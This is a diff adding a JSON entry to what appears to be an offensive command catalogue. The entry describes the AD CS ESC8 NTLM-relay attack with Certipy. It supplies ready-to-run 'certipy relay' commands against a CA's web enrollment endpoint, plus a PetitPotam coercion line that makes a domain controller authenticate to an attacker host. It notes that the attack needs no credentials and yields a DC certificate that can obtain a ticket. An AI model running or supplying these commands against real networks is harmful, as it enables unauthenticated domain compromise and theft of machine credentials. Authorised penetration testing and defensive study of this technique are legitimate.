@@ -1,0 +1,21 @@
+{
+  "id": "certipy-esc8",
+  "name": "Certipy ESC8 (HTTP Web Enrollment Relay)",
+  "command": "certipy relay -target 'http://<ca-fqdn>' -template '<template>'",
+  "description": "ESC8: AD CS Web Enrollment endpoint accepts NTLM and is missing EPA. Relay coerced machine authentication (PetitPotam, DFSCoerce, PrinterBug) to /certsrv to enroll a cert as the victim — typically a DC machine account, yielding a TGT-capable certificate.",
+  "platform": "linux",
+  "requires": ["no-creds"],
+  "protocols": ["http", "ntlm"],
+  "tags": ["certipy", "adcs", "esc8", "relay", "ntlm-relay", "web-enrollment"],
+  "variations": [
+    { "label": "Default DomainController template", "requires": "no-creds", "command": "certipy relay -target 'http://<ca-fqdn>' -template DomainController" }
+  ],
+  "references": [
+    { "title": "Certipy ESC8", "url": "https://github.com/ly4k/Certipy" }
+  ],
+  "examples": [
+    "certipy relay -target 'http://ca.corp.local' -template DomainController",
+    "# In another terminal: coerce auth from DC to your relay host",
+    "python3 PetitPotam.py <attacker-ip> <dc-ip>"
+  ]
+}
